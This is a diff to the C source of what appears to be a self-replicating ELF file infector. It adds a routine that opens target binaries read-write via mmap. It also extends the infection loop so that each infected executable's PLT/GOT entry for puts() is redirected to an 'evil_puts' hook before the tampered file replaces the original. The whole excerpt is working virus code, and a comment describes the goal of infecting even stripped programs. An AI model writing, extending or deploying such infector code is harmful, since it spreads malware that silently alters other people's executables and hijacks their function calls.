@@ -499,6 +499,48 @@ int load_target(const char *path, elfbin_t *elf)
 	return 0;
 }
 
+int load_target_writeable(const char *path, elfbin_t *elf)
+{
+        int i;
+        struct stat st;
+        elf->path = (char *)path;
+        int fd = _open(path, O_RDWR, 0);
+        if (fd < 0)
+                return -1;
+        elf->fd = fd;
+        if (_fstat(fd, &st) < 0)
+                return -1;
+        elf->mem = _mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+        if (elf->mem == MAP_FAILED)
+                return -1;
+        elf->ehdr = (Elf64_Ehdr *)elf->mem;
+        elf->phdr = (Elf64_Phdr *)&elf->mem[elf->ehdr->e_phoff];
+        elf->shdr = (Elf64_Shdr *)&elf->mem[elf->ehdr->e_shoff];
+        for (i = 0; i < elf->ehdr->e_phnum; i++) {
+                switch(elf->phdr[i].p_type) {
+                        case PT_LOAD:
+                                switch(!!elf->phdr[i].p_offset) {
+                                case 0:
+                                        elf->textVaddr = elf->phdr[i].p_vaddr;
+                                        elf->textSize = elf->phdr[i].p_memsz;
+                                        break;
+                                case 1:
+                                        elf->dataVaddr = elf->phdr[i].p_vaddr;
+                                        elf->dataSize = elf->phdr[i].p_memsz;
+                                        elf->dataOff = elf->phdr[i].p_offset;
+                                        break;
+                        }
+                                break;
+                        case PT_DYNAMIC:
+                                elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset];
+                                break;
+                }
+
+        }
+        elf->st = st;
+        elf->size = st.st_size;
+        return 0;
+}
 /* 
  * We hook puts() for l33t sp34k 0utput. We parse the phdr's dynamic segment
  * directly so we can still infect programs that are stripped of section header
@@ -693,6 +735,9 @@ void do_main(struct bootstrap_data *bootstrap)
 infect:
 			load_target(fpath, &target);
 			infect_elf_file(&self, &target);
+			unload_target(&target);
+			load_target_writeable(TMP, &target);
+			infect_pltgot(&target, PIC_RESOLVE_ADDR(&evil_puts));
 			unload_target(&target);
 			_rename(TMP, fpath);
 			icount++;
